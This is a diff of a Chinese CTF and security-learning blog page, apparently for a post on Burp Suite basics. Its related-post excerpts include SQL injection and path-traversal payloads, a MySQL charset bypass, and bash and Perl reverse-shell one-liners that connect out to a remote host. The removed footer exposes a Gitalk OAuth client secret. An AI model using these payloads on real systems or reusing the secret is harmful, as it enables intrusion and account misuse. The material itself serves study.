-        <a href="http://wpa.qq.com/msgrd?v=3&uin=487280636&site=qq&menu=yes" title="QQ → http:&#x2F;&#x2F;wpa.qq.com&#x2F;msgrd?v&#x3D;3&amp;uin&#x3D;487280636&amp;site&#x3D;qq&amp;menu&#x3D;yes" rel="noopener" target="_blank"><i class="fa fa-fw fa-instagram"></i>QQ</a>
-      </span>
-  </div>
-  <div class="cc-license motion-element" itemprop="license">
-    <a href="https://creativecommons.org/publicdomain/zero/1.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-zero.svg" alt="Creative Commons"></a>
-  </div>
-
-
-
-      </div>
-
-    </div>
-  </aside>
-  <div id="sidebar-dimmer"></div>
-
-
-      </div>
-    </main>
-
-    <footer class="footer">
-      <div class="footer-inner">
-        
-
-<div class="copyright">
-  
-  &copy; 
-  <span itemprop="copyrightYear">2026</span>
-  <span class="with-love">
-    <i class="fa fa-user"></i>
-  </span>
-  <span class="author" itemprop="copyrightHolder">信安小蚂蚁</span>
-</div>
-
-
-
-
-
-
-
-
-
-        
-<div class="busuanzi-count">
-  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
-</div>
-
-
-
-
-
-
-
-
-      </div>
-    </footer>
-  </div>
-
-  
-  <script src="/lib/anime.min.js"></script>
-  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
-  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
-  <script src="//cdn.jsdelivr.net/npm/lozad@1/dist/lozad.min.js"></script>
-  <script src="/lib/velocity/velocity.min.js"></script>
-  <script src="/lib/velocity/velocity.ui.min.js"></script>
-
-<script src="/js/utils.js"></script>
-
-<script src="/js/motion.js"></script>
-
-
-<script src="/js/schemes/muse.js"></script>
-
-
-<script src="/js/next-boot.js"></script>
-
-
-
-
-  
-
-
-
-
-  
-<script src="/js/local-search.js"></script>
-
-
-
-
-
-
-
-
-
-
-
-
-
-  
-
-  
-
-<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1.8.0/dist/gitalk.min.css">
-
-<script>
-NexT.utils.loadComments(document.querySelector('#gitalk-container'), () => {
-  NexT.utils.getScript('//cdn.jsdelivr.net/npm/gitalk@1.8.0/dist/gitalk.min.js', () => {
-    var gitalk = new Gitalk({
-      clientID    : 'Ov23li6cOHoOwCcszzi9',
-      clientSecret: '8f2a2156cf47355ba518edf71e62d5e1618dc229',
-      repo        : 'mayi077.github.io',
-      owner       : 'mayi077',
-      admin       : ['mayi077'],
-      id          : '434353a55d853830bfb90eef57e87480',
-        language: 'zh-CN',
-      distractionFreeMode: true,
-      enablePKCE: true
-    });
-    gitalk.render('gitalk-container');
-  }, window.Gitalk);
-});
-</script>
-
-</body>
-</html>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://mayi077.github.io">信安小蚂蚁</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://mayi077.github.io/2020/01/12/burpsuit%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/">https://mayi077.github.io/2020/01/12/burpsuit%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://mayi077.github.io" target="_blank">信安小蚂蚁</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E5%9F%BA%E7%A1%80%E7%A7%AF%E7%B4%AF/">基础积累</a></div><div class="post-share"><div class="social-share" data-image="/images/1.jpg" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2020/01/13/web-%E9%9A%8F%E4%BE%BF%E6%B3%A8/" title="web--随便注"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">web--随便注</div></div><div class="info-2"><div class="info-item-1">前言 &emsp; 这题主要用到了堆叠注入以及rename改表名，alert 改列名。下面我总结解题思路时也会适当的阐述一下alert和rename的用法。 0X01 判断是否存在sql注入 首先我尝试了传入1&#39; 发现报错，那么就是说它很大几率可以被单引号闭合。 接着我尝试传出 1&#39;  --+ 发现回显正常那么基本就已经确定存在sql注入了。 0X02 开始sql注入 还是老样子，先看有几个字段（列）传入 1’order by 3 --+ 发现报错，传入1&#39; order by 2 --+ 发现回显正常，说明有2个字段（列） 接着尝试爆数据库，传入1&#39; union select 1,databases --+ 发现题目提示有过滤语句，过滤了select （一般情况下过滤了select 也就意味着要用堆叠注入了而不再使用联合注入） 什么是堆叠注入:&emsp;在SQL中，分号（;）是用来表示一条sql语句的结束。结束一个sql语句后继续构造下一条语句，会一起被执行；这也就形成了堆叠注入。 开始堆叠注入，首先爆数据库看看。传入1&#39;;show da...</div></div></div></a><a class="pagination-related" href="/2020/01/11/hexo-%E7%A0%81%E4%BA%91%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/" title="hexo+码云搭建个人博客"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">hexo+码云搭建个人博客</div></div><div class="info-2"><div class="info-item-1">前言：不知什么时候开始就有了自己搭建个人博客的想法，但由于时间关系还是拖到了现在。看了些文章后感觉搭建个人博客也就那样应该很简单，但实际操作时却总会给我们意想不到的惊喜。于是乎我选择了记录这个过程，以免以后遇到相同问题不会解决。 一、我为什么选择hexo+码云来搭建自己的博客 选择hexo完全是因为我只对它有过些了解，且它有很多的主题可供选着。 选着码云因为码云作为国内网站，访问速度自然是比Github快一些，且更容易被SEO收录提升博客的曝光率。  二、具体操作步骤 先安装好Git和Node.js。(很简单的，实在不会可以百度教程也多) 接下来就可以安装我们的hexo了(全局安装)，可以使用cmd命令行，输入以下命令：1npm install -g hexo-cli 指定一个文件夹来存放网站文件（也就是网站的根目录）123hexo init mayi077  #在这个地址里生成Hexo初始化文件cd mayi077  # 进入这个文件夹npm install  # 在文件夹内自动安装Hexo所依赖的各种模块（实际上我没有进行这一步） &emsp; 经过以上3步，Hexo就初始化...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2020/08/01/Mysql%E5%AD%97%E7%AC%A6%E9%9B%86%E8%BD%AC%E6%8D%A2%E6%BC%8F%E6%B4%9E/" title="Mysql字符集转换漏洞"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2020-08-01</div><div class="info-item-2">Mysql字符集转换漏洞</div></div><div class="info-2"><div class="info-item-1">测试代码大体如下: 12345mysql_query(&quot;set names utf8&quot;);if ($username === &#x27;admin&#x27;) &#123;    die(&#x27;Permission denied!&#x27;);&#125;$result = $mysqli-&gt;query(&quot;SELECT * FROM z_users where username = &#x27;&#123;$username&#125;&#x27; &quot;);  利用ASCii码来理解我们想要绕过，我们可以靠输入16进制进去，然后MySQL无法解析的字符会自动省略。 值得注意的是，00-1F 是自动忽略，而后面的特殊字符会进行截断测试发现我们输入不可显示的字符的16进制可以绕过，如payload:   1http://127.0.0.1/test/mysql_char.php?username=admin%11 当然这里的%11可以为其它任何的不可显示的字符的十六进制。   【ASCII码】        其实理解为 ASCI...</div></div></div></a><a class="pagination-related" href="/2020/01/29/2017%E7%99%BE%E5%BA%A6%E6%9D%AF-%E4%BA%8C%E6%9C%88%E5%9C%BA-Zone/" title="2017百度杯-二月场-Zone"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2020-01-29</div><div class="info-item-2">2017百度杯-二月场-Zone</div></div><div class="info-2"><div class="info-item-1">前言：&emsp;一直打buu的web有点难受呀，于是去了“i春秋”做了2题。这里主要记录一下 Zone， 不看别人wp我死也写不出来呀。冲呀，我要争取有机会去打蓝帽杯，加油！！好运来！！ 0X01 解题过程 打开链接，弹出以下提示框    &emsp;    单击确定后进入登入页面，无论输入什么账户和密码都弹出以下提示框并且登入失败。    &emsp;    尝试burp抓包发现cookie中有个login，值为0，将0改为1后在访问首页，发现可以正常登入（乱码不用管）  单击 “manage” （此时还是需要用burp改login的值），发现url出现/manages/admin.php?module=index&amp;name=php显然module有可能存在文件包含，经过测试发现会将../替换为空，于是我们尝试一下是否可以包含使用manages/admin.php?module=....//....//....//....//etc/passwd&amp;name=注意，name后面最好不加东西为啥我也不知道。&emsp;    接着就查看nginx.conf文件，因...</div></div></div></a><a class="pagination-related" href="/2020/02/14/SUCTF-2019-EasyWeb/" title="[SUCTF 2019]EasyWeb"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2020-02-14</div><div class="info-item-2">[SUCTF 2019]EasyWeb</div></div><div class="info-2"><div class="info-item-1">0X01 涉及知识点 无数字字母shell 利用.htaccess上传文件 绕过open_basedir  0X02 无数字字母shell 打开链接，可以得到源码：1234567891011121314151617181920212223242526272829303132333435363738 &lt;?phpfunction get_the_flag()&#123;    // webadmin will remove your upload file every 20 min!!!!     $userdir = &quot;upload/tmp_&quot;.md5($_SERVER[&#x27;REMOTE_ADDR&#x27;]);    if(!file_exists($userdir))&#123;    mkdir($userdir);    &#125;    if(!empty($_FILES[&quot;file&quot;]))&#123;        $tmp_name = $_FILES[&quot;file&quot;][&quot;tmp_n...</div></div></div></a><a class="pagination-related" href="/2020/05/09/MRCTF2020-Ezpop/" title="[MRCTF2020]Ezpop"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2020-05-09</div><div class="info-item-2">[MRCTF2020]Ezpop</div></div><div class="info-2"><div class="info-item-1">我还是太菜了呀。 题目给了源码12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849 &lt;?phpclass Modifier &#123;    protected  $var;    public function append($value)&#123;        include($value); //可以使用伪协议    &#125;    public function __invoke()&#123; //调用函数的方式调用一个对象时的回应方法        $this-&gt;append($this-&gt;var);    &#125;&#125;class Show&#123;    public $source;    public $str;    public function __construct($file=&#x27;index.php&#x27;)&#123;        $this-&gt;source = $...</div></div></div></a><a class="pagination-related" href="/2020/03/06/githacker-%E5%8F%8A%E4%BD%BF%E7%94%A8%E6%97%B6%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98/" title="githacker 及使用时遇到的问题"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2020-03-06</div><div class="info-item-2">githacker 及使用时遇到的问题</div></div><div class="info-2"><div class="info-item-1">前言:&emsp; 在做 CTFhub Git泄漏之log时遇到了一些问题这里记一下。 githacker 和 githack 有什么区别呢？&emsp;其实以前我一直使用的是 githack 但是这题却力不从心，他们长得还有点像呢。githack只拉源码没有复原git整个记录。&emsp;这里用网上的一段话解析一下吧 :GitHacker是一个多线程工具，用于检测站点是否存在git源码泄漏，并能够将网站源代码下载到本地。值得一提的是，这个工具会将整个git repo恢复到本地，而不是像[githack]那样，只是简单的恢复到最新版本。如此一来，你就可以查看到开发人员的历史提交记录以及提交注释，以更好的掌握开发者的性格和心理，从而为进一步的代码审计奠定基础。直接百度 githacker &emsp;它的github下载说明也有详细的介绍。  如何使用 githacker&emsp;它的使用也非常简单 python Githacker.py url/.git/即可。  正确下载安装 git ，我就是因为git安装这里出了点问题害我找了好久。 给python 安装 requests ...</div></div></div></a><a class="pagination-related" href="/2020/03/27/%E5%8F%8D%E5%BC%B9shell-payload%E6%80%BB%E7%BB%93/" title="反弹shell payload总结"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2020-03-27</div><div class="info-item-2">反弹shell payload总结</div></div><div class="info-2"><div class="info-item-1">前言：&emsp;有时候需要用到反弹shell，但是题目会有过滤，所以我就总结一下大多数可以用的payload 以便下次使用。 这么多的payload总有一个适合你bash版本1bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1 注意这个是由解析shell的bash完成，所以某些情况下不支持。 Perl版本1perl -e &#x27;use Socket;$i=&quot;10.0.0.1&quot;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/images/1.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">信安小蚂蚁</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">135</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">86</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">11</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/mayi077"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">2020–2021，这里记录了 100+ 篇文字。
+后来因工作入职，暂时搁笔。
+2026，重新起航。
+继续写下去。
+</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E3%80%81BurpSuite%E7%9A%84%E5%AE%89%E8%A3%85"><span class="toc-number">1.</span> <span class="toc-text">一、BurpSuite的安装</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%E3%80%81Burp-Suite%E7%9A%84%E5%9F%BA%E6%9C%AC%E9%85%8D%E7%BD%AE"><span class="toc-number">2.</span> <span class="toc-text">二、Burp Suite的基本配置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%89%E3%80%81BurpSuite-%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8"><span class="toc-number">3.</span> <span class="toc-text">三、BurpSuite 的基本使用</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/04/20/2026-04-20-TLS%E5%8A%A0%E5%AF%86%E5%A5%97%E4%BB%B6/" title="TLS加密套件">TLS加密套件</a><time datetime="2026-04-20T14:30:00.000Z" title="发表于 2026-04-20 22:30:00">2026-04-20</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/04/20/2026-04-20-AI-Agent-%E6%9E%B6%E6%9E%84/" title="AI Agent 架构">AI Agent 架构</a><time datetime="2026-04-19T16:00:00.000Z" title="发表于 2026-04-20 00:00:00">2026-04-20</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2021/04/15/PHP-%E6%AD%A3%E5%88%99%E7%9A%84-m%E5%A4%9A%E8%A1%8C%E6%A8%A1%E5%BC%8F/" title="PHP 正则的 m多行模式">PHP 正则的 m多行模式</a><time datetime="2021-04-15T00:54:31.000Z" title="发表于 2021-04-15 08:54:31">2021-04-15</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2021/04/14/vulnstack-ATT-CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97-%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/" title="vulnstack-ATT&amp;CK实战系列 红队实战（一）">vulnstack-ATT&amp;CK实战系列 红队实战（一）</a><time datetime="2021-04-14T12:46:10.000Z" title="发表于 2021-04-14 20:46:10">2021-04-14</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2021/04/09/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/" title="域内横向移动">域内横向移动</a><time datetime="2021-04-09T07:56:53.000Z" title="发表于 2021-04-09 15:56:53">2021-04-09</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By 信安小蚂蚁</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 5.4.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.5-b1</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.5-b1"></script><script src="/js/main.js?v=5.5.5-b1"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
